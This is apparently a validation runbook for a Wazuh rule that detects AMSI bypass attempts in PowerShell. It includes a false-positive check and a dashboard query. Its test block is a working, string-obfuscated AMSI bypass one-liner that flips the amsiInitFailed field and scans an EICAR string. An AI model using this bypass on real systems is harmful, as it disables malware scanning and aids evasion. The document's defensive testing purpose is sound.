# AMSI bypass prevention and detection validation

## Rule file

`rules/amsi_bypass_detection.xml`

## Prerequisites

- Windows PowerShell 5.1 in Full Language Mode.
- Defender antivirus, real-time protection, and AMSI enabled.
- WIN01 agent `004` collecting PowerShell Operational 4103 events.
- Do not disable Defender or execute a payload.

## Bounded test

The command uses a harmless EICAR test string and attempts a process-local `AmsiUtils.amsiInitFailed` flip with immediate restoration. Defender is expected to block the script before execution.

```powershell
$t=[Ref].Assembly.GetType(('System.Management.Automation.'+('Amsi'+'Utils')));$m=$t.GetMethod('ScanContent','NonPublic,Static');$f=$t.GetField(('amsiInit'+'Failed'),'NonPublic,Static');$sig=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('WDVPIVAlQEFQWzRcUFpYNTQoUF4pN0NDKTd9JEVJQ0FSLVNUQU5EQVJELUFOVElWSVJVUy1URVNULUZJTEUhJEgrSCo='));$old=$f.GetValue($null);$before=[int]$m.Invoke($null,[object[]]@($sig,'AMSI_BASELINE'));try{$f.SetValue($null,$true);$during=[int]$m.Invoke($null,[object[]]@($sig,'AMSI_BYPASS_LAB'))}finally{$f.SetValue($null,$old)};$after=[int]$m.Invoke($null,[object[]]@($sig,'AMSI_RESTORED'));[pscustomobject]@{BaselineResult=$before;BypassResult=$during;RestoredResult=$after;BypassObserved=($before-ge32768-and$during-lt32768);RecoveryPassed=($after-ge32768)}|Format-List
```

Expected endpoint result: `ScriptContainedMaliciousContent`. Expected Wazuh result: final child rule `100538`, level 14, MITRE `T1562.001`.

## False-positive test

```powershell
Write-Output 'AmsiScanBuffer documentation review';'AMSI_FP_DONE'
```

Expected: 4103/4104 telemetry, no `100537` or `100538` alert.

## Dashboard

```text
agent.id:"004" AND rule.id:"100538"
```

## Cleanup

No payload, file, persistent setting, or successful memory modification is created. Defender blocks the command before execution; no endpoint cleanup is required.
